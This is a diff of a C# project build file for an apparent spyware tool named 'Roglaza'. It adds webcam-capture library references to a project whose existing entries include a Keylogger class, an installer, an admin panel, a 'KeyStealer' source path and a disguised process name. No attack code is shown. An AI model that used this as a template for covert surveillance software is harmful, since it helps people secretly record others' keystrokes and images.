@@ -38,6 +38,66 @@
     <ApplicationIcon>Images\roglaza.ico</ApplicationIcon>
   </PropertyGroup>
   <ItemGroup>
+    <Reference Include="AForge">
+      <HintPath>C:\Users\Exception\Downloads\webcam\webcam\Referances\AForge.dll</HintPath>
+    </Reference>
+    <Reference Include="AForge.Controls">
+      <HintPath>C:\Users\Exception\Downloads\webcam\webcam\Referances\AForge.Controls.dll</HintPath>
+    </Reference>
+    <Reference Include="AForge.Fuzzy">
+      <HintPath>C:\Users\Exception\Downloads\webcam\webcam\Referances\AForge.Fuzzy.dll</HintPath>
+    </Reference>
+    <Reference Include="AForge.Genetic">
+      <HintPath>C:\Users\Exception\Downloads\webcam\webcam\Referances\AForge.Genetic.dll</HintPath>
+    </Reference>
+    <Reference Include="AForge.Imaging">
+      <HintPath>C:\Users\Exception\Downloads\webcam\webcam\Referances\AForge.Imaging.dll</HintPath>
+    </Reference>
+    <Reference Include="AForge.Imaging.Formats">
+      <HintPath>C:\Users\Exception\Downloads\webcam\webcam\Referances\AForge.Imaging.Formats.dll</HintPath>
+    </Reference>
+    <Reference Include="AForge.Imaging.IPPrototyper">
+      <HintPath>C:\Users\Exception\Downloads\webcam\webcam\Referances\AForge.Imaging.IPPrototyper.dll</HintPath>
+    </Reference>
+    <Reference Include="AForge.MachineLearning">
+      <HintPath>C:\Users\Exception\Downloads\webcam\webcam\Referances\AForge.MachineLearning.dll</HintPath>
+    </Reference>
+    <Reference Include="AForge.Math">
+      <HintPath>C:\Users\Exception\Downloads\webcam\webcam\Referances\AForge.Math.dll</HintPath>
+    </Reference>
+    <Reference Include="AForge.Neuro">
+      <HintPath>C:\Users\Exception\Downloads\webcam\webcam\Referances\AForge.Neuro.dll</HintPath>
+    </Reference>
+    <Reference Include="AForge.Robotics.Lego">
+      <HintPath>C:\Users\Exception\Downloads\webcam\webcam\Referances\AForge.Robotics.Lego.dll</HintPath>
+    </Reference>
+    <Reference Include="AForge.Robotics.Surveyor">
+      <HintPath>C:\Users\Exception\Downloads\webcam\webcam\Referances\AForge.Robotics.Surveyor.dll</HintPath>
+    </Reference>
+    <Reference Include="AForge.Robotics.TeRK">
+      <HintPath>C:\Users\Exception\Downloads\webcam\webcam\Referances\AForge.Robotics.TeRK.dll</HintPath>
+    </Reference>
+    <Reference Include="AForge.Video">
+      <HintPath>C:\Users\Exception\Downloads\webcam\webcam\Referances\AForge.Video.dll</HintPath>
+    </Reference>
+    <Reference Include="AForge.Video.DirectShow">
+      <HintPath>C:\Users\Exception\Downloads\webcam\webcam\Referances\AForge.Video.DirectShow.dll</HintPath>
+    </Reference>
+    <Reference Include="AForge.Video.FFMPEG">
+      <HintPath>C:\Users\Exception\Downloads\webcam\webcam\Referances\AForge.Video.FFMPEG.dll</HintPath>
+    </Reference>
+    <Reference Include="AForge.Video.Kinect">
+      <HintPath>C:\Users\Exception\Downloads\webcam\webcam\Referances\AForge.Video.Kinect.dll</HintPath>
+    </Reference>
+    <Reference Include="AForge.Video.VFW">
+      <HintPath>C:\Users\Exception\Downloads\webcam\webcam\Referances\AForge.Video.VFW.dll</HintPath>
+    </Reference>
+    <Reference Include="AForge.Video.Ximea">
+      <HintPath>C:\Users\Exception\Downloads\webcam\webcam\Referances\AForge.Video.Ximea.dll</HintPath>
+    </Reference>
+    <Reference Include="AForge.Vision">
+      <HintPath>C:\Users\Exception\Downloads\webcam\webcam\Referances\AForge.Vision.dll</HintPath>
+    </Reference>
     <Reference Include="Interop.IWshRuntimeLibrary">
       <HintPath>C:\Users\Exception\Downloads\KeyStealer-master\KeyStealer-master\Windows Local Host Process\Windows Local Host Process\obj\Debug\Interop.IWshRuntimeLibrary.dll</HintPath>
       <EmbedInteropTypes>True</EmbedInteropTypes>
@@ -67,6 +127,12 @@
     <Compile Include="Classes\HistoryHandler.cs" />
     <Compile Include="Classes\Keylogger.cs" />
     <Compile Include="Classes\MessageStrings.cs" />
+    <Compile Include="Forms\Form1.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\Form1.Designer.cs">
+      <DependentUpon>Form1.cs</DependentUpon>
+    </Compile>
     <Compile Include="Forms\FrmAdminPanel.cs">
       <SubType>Form</SubType>
     </Compile>
@@ -90,6 +156,9 @@
     <Compile Include="Classes\RoglazaHelper.cs" />
     <Compile Include="Classes\RoglazaSettings.cs" />
     <Compile Include="Classes\RoglazaInstaller.cs" />
+    <EmbeddedResource Include="Forms\Form1.resx">
+      <DependentUpon>Form1.cs</DependentUpon>
+    </EmbeddedResource>
     <EmbeddedResource Include="Forms\FrmAdminPanel.resx">
       <DependentUpon>FrmAdminPanel.cs</DependentUpon>
       <SubType>Designer</SubType>
